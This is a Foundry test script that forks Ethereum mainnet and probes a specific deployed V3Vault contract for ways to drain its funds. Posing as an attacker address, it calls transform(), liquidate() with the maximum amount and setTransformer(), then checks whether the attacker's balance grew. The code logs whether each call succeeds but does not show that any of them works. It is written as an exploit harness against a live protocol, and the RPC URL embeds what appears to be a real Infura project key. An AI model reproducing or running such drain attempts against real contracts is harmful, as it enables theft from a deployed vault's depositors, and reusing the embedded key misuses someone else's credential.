// SPDX-License-Identifier: MIT
pragma solidity ^0.8.19;

import "forge-std/Test.sol";

/**
 * @title V3Vault Deep Exploit
 * @notice liquidate() and transform() succeeded - check if they can drain funds
 */
contract V3VaultDeepExploitTest is Test {

    address V3VAULT;
    address attacker;
    address WETH;
    address USDC;

    function setUp() public {
        vm.createSelectFork("https://mainnet.infura.io/v3/bfc7283659224dd6b5124ebbc2b14e2c");
        V3VAULT = vm.parseAddress("0x74826fE70a49af1ae0a5F6C9fD5f72eD24e51904");
        attacker = address(0xBEEF);
        WETH = vm.parseAddress("0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2");
        USDC = vm.parseAddress("0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48");
    }

    function test_V3VaultAnalysis() public {
        console.log("=== V3VAULT DEEP ANALYSIS ===");
        console.log("V3Vault:", V3VAULT);

        // Check asset
        (bool s, bytes memory d) = V3VAULT.staticcall(
            abi.encodeWithSignature("asset()")
        );
        address asset;
        if (s && d.length >= 32) {
            asset = abi.decode(d, (address));
            console.log("Asset:", asset);
        }

        // Get total assets
        (s, d) = V3VAULT.staticcall(
            abi.encodeWithSignature("totalAssets()")
        );
        if (s && d.length >= 32) {
            uint256 ta = abi.decode(d, (uint256));
            console.log("Total Assets:", ta);
        }

        // Get lend exchange rate
        (s, d) = V3VAULT.staticcall(
            abi.encodeWithSignature("lendExchangeRateX96()")
        );
        if (s && d.length >= 32) {
            uint256 rate = abi.decode(d, (uint256));
            console.log("Lend Exchange Rate:", rate);
        }

        // Check if there are any loans
        (s, d) = V3VAULT.staticcall(
            abi.encodeWithSignature("debtSharesTotal()")
        );
        if (s && d.length >= 32) {
            uint256 debt = abi.decode(d, (uint256));
            console.log("Debt Shares Total:", debt);
        }

        // Check owner
        (s, d) = V3VAULT.staticcall(
            abi.encodeWithSignature("owner()")
        );
        if (s && d.length >= 32) {
            address owner = abi.decode(d, (address));
            console.log("Owner:", owner);
        }

        // Check if there are transform approvals
        console.log("");
        console.log("=== TESTING TRANSFORM ATTACK ===");

        // Get some token balances before
        uint256 vaultAssetBefore;
        if (asset != address(0)) {
            (s, d) = asset.staticcall(
                abi.encodeWithSignature("balanceOf(address)", V3VAULT)
            );
            if (s && d.length >= 32) {
                vaultAssetBefore = abi.decode(d, (uint256));
                console.log("Vault asset balance:", vaultAssetBefore);
            }
        }

        // Try transform with attacker as transformer
        vm.startPrank(attacker);

        // transform(uint256 tokenId, address transformer, bytes data)
        // Try to call transform and drain via callback
        bytes memory transformData = abi.encode(attacker, uint256(1 ether));

        (s,) = V3VAULT.call(
            abi.encodeWithSignature("transform(uint256,address,bytes)", 0, attacker, transformData)
        );
        console.log("transform(0, attacker, data):", s ? "SUCCESS" : "FAILED");

        // Try liquidate with large amount
        (s,) = V3VAULT.call(
            abi.encodeWithSignature("liquidate(uint256,uint256)", 1, type(uint256).max)
        );
        console.log("liquidate(1, max):", s ? "SUCCESS" : "FAILED");

        // Check balance after
        if (asset != address(0)) {
            (s, d) = asset.staticcall(
                abi.encodeWithSignature("balanceOf(address)", attacker)
            );
            if (s && d.length >= 32) {
                uint256 attackerBal = abi.decode(d, (uint256));
                console.log("Attacker asset balance:", attackerBal);
            }
        }

        vm.stopPrank();
    }

    function test_checkV3Loans() public {
        console.log("=== CHECKING V3VAULT LOANS ===");

        // The vault uses NFTs for positions - check token count
        (bool s, bytes memory d) = V3VAULT.staticcall(
            abi.encodeWithSignature("tokenByIndex(uint256)", 0)
        );
        if (s && d.length >= 32) {
            uint256 tokenId = abi.decode(d, (uint256));
            console.log("First token ID:", tokenId);

            // Get loan info for this token
            (s, d) = V3VAULT.staticcall(
                abi.encodeWithSignature("loans(uint256)", tokenId)
            );
            if (s && d.length >= 32) {
                console.log("Loan data length:", d.length);
            }
        }

        // Try to find tokens that might have loans
        for (uint256 i = 0; i < 5; i++) {
            (s, d) = V3VAULT.staticcall(
                abi.encodeWithSignature("tokenByIndex(uint256)", i)
            );
            if (s && d.length >= 32) {
                uint256 tokenId = abi.decode(d, (uint256));
                console.log("Token", i, ":", tokenId);

                // Check debt for this token
                (s, d) = V3VAULT.staticcall(
                    abi.encodeWithSignature("loans(uint256)", tokenId)
                );
            }
        }
    }

    function test_exploitViaEmergencyAdmin() public {
        console.log("=== CHECKING EMERGENCY ADMIN ===");

        // Check if there's an emergency admin function
        (bool s, bytes memory d) = V3VAULT.staticcall(
            abi.encodeWithSignature("emergencyAdmin()")
        );
        if (s && d.length >= 32) {
            address emergencyAdmin = abi.decode(d, (address));
            console.log("Emergency Admin:", emergencyAdmin);

            if (emergencyAdmin == address(0)) {
                console.log("!!! EMERGENCY ADMIN NOT SET !!!");
            }
        }

        // Try to set ourselves as transformer
        vm.startPrank(attacker);

        (s,) = V3VAULT.call(
            abi.encodeWithSignature("setTransformer(address,bool)", attacker, true)
        );
        console.log("setTransformer(attacker, true):", s ? "SUCCESS" : "FAILED");

        vm.stopPrank();
    }
}
